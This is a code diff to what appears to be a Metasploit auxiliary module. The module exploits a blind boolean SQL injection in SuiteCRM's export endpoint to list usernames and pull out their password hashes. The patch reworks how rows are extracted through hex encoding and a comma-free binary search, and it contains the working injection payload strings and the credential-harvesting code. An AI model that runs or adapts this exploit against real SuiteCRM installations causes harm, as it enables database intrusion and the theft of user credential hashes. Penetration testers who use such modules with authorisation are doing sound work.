@@ -161,6 +161,10 @@ class MetasploitModule < Msf::Auxiliary
     if res&.code != 200
       fail_with(Failure::UnexpectedReply, "The server did not respond to the request with the payload: #{payload}")
     end
+    content_type = res.headers['Content-Type'].to_s.split(';', 2).first.to_s.strip.downcase
+    unless content_type == 'text/comma-separated-values'
+      fail_with(Failure::UnexpectedReply, 'SuiteCRM export did not return CSV; verify Account access and server logs')
+    end
     res
   end
 
@@ -173,12 +177,26 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status 'Fetching Users, please wait...'
-    # Limit before aggregation while keeping SQL comma-free for this endpoint.
-    query = 'select group_concat(user_name order by user_name) from (select distinct user_name from users order by user_name'
+    # Extract individual HEX rows to preserve names without GROUP_CONCAT's
+    # server-side truncation limit. Bound selection before per-row extraction.
+    query = 'select distinct user_name from users order by user_name'
     query << " limit #{count}" if count.positive?
-    query << ') suitecrm_users'
-    users = sqli.run_sql(query)
-    users.split(',')
+    user_count = sqli.run_sql("select count(user_name) from (#{query}) suitecrm_users")
+    unless user_count.is_a?(String) && user_count.match?(/\A\d+\z/)
+      fail_with(Failure::UnexpectedReply, 'Username extraction did not return a valid user count')
+    end
+
+    user_count.to_i.times.map do |index|
+      encoded = sqli.run_sql("select hex(user_name) from (#{query}) suitecrm_users where user_name is not null order by user_name limit 1 offset #{index}")
+      fail_with(Failure::UnexpectedReply, 'Username extraction did not return a string') unless encoded.is_a?(String)
+      unless encoded.match?(/\A(?:[0-9a-fA-F]{2})+\z/)
+        fail_with(Failure::UnexpectedReply, 'Username extraction returned malformed hexadecimal data')
+      end
+      username = Rex::Text.hex_to_raw(encoded).force_encoding(::Encoding::UTF_8)
+      fail_with(Failure::UnexpectedReply, 'Username extraction returned invalid UTF-8 data') unless username.valid_encoding?
+
+      username
+    end
   end
 
   # Use blind boolean SQL injection to determine the user_hashes of given usernames
@@ -187,7 +205,7 @@ class MetasploitModule < Msf::Auxiliary
     hashes = []
     number_of_users = users.size
     users.each_with_index do |username, index|
-      hash = sqli.run_sql("select user_hash from users where user_name='#{username}'")
+      hash = sqli.run_sql("select user_hash from users where user_name=0x#{Rex::Text.to_hex(username, '')}")
       hashes << [username, hash]
       print_good "(#{index + 1}/#{number_of_users}) Username : #{username} ; Hash : #{hash}"
       create_credential({
@@ -212,78 +230,33 @@ class MetasploitModule < Msf::Auxiliary
     wrong_resp_length = send_injection_request_cgi(',\\,))+AND+1=2;+--+')&.body&.length
     fail_with(Failure::UnexpectedReply, 'The server responded unexpectedly to a request sent with uid: ",\\,))+AND+1=2;+--+"') unless wrong_resp_length
     sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
+      # SuiteCRM HTML-encodes angle brackets. The shared detector compares a
+      # nonnegative byte length, so express its predicate without a raw >.
+      if (comparison = payload.match(/\A(length\(cast\(\(.*\) as binary\)\))>(\d+)\z/m))
+        payload = "#{comparison[1]} NOT BETWEEN 0 AND #{comparison[2]}"
+      end
       fail_with(Failure::BadConfig, 'comma in payload') if payload.include?(',')
       resp_length = send_injection_request_cgi(",\\,))+OR+(#{payload});+--+")&.body&.length
       resp_length != wrong_resp_length
     end
 
-    # redefine blind_detect_length and blind_dump_data because of the bad characters the payload cannot include
-
-    def sqli.blind_detect_length(query, _timebased)
-      output_length = 0
-      min_length = 0
-      max_length = 800
-      loop do
-        break if blind_request("length(cast((#{query}) as binary))=#{output_length}")
-
-        flag = blind_request("length(cast((#{query}) as binary))+BETWEEN+#{output_length}+AND+#{max_length}")
-        if flag
-          min_length = output_length + 1
-          if max_length - min_length <= 1
-            if blind_request("length(cast((#{query}) as binary))=#{min_length}")
-              output_length = min_length
-              break
-            elsif blind_request("length(cast((#{query}) as binary))=#{max_length}")
-              output_length = max_length
-              break
-            else
-              fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')
-            end
-          end
-          output_length = (min_length + max_length) / 2 + 1
-        else
-          max_length = output_length
-          output_length = (min_length + max_length) / 2 - 1
-        end
-      end
-      output_length
-    end
-
+    # The shared length detector already generates comma-free SQL. Only byte
+    # extraction needs an alternate SUBSTR grammar for this endpoint.
     def sqli.blind_dump_data(query, length, _known_bits, _bits_to_guess, _timebased)
-      output = [ ]
-      position = 1
-      length.times do |_j|
-        character_value = 0
-        min_value = 0
-        max_value = 1000
-        loop do
-          break if blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{character_value}")
-
-          flag = blind_request("(select ascii(substr((#{query}) from #{position} for 1)))+BETWEEN+#{character_value}+AND+#{max_value}")
-          if flag
-            min_value = character_value + 1
-            if max_value - min_value <= 1
-              if blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{min_value}")
-                character_value = min_value
-                break
-              elsif blind_request("(select ascii(substr((#{query}) from #{position} for 1)))=#{max_value}")
-                character_value = max_value
-                break
-              else
-                fail_with(Failure::UnexpectedReply, 'Somehow this got messed up!')
-              end
-            end
-            character_value = (min_value + max_value) / 2 + 1
+      length.times.map do |index|
+        lower = 0
+        upper = 255
+        while lower < upper
+          middle = (lower + upper) / 2
+          condition = "ascii(substr(cast((#{query}) as binary) from #{index + 1} for 1)) NOT BETWEEN 0 AND #{middle}"
+          if blind_request(condition)
+            lower = middle + 1
           else
-            max_value = character_value
-            character_value = (min_value + max_value) / 2 - 1
+            upper = middle
           end
         end
-
-        position += 1
-        output << character_value
-      end
-      output.map(&:chr).join
+        lower.chr(::Encoding::BINARY)
+      end.join
     end
 
     sqli
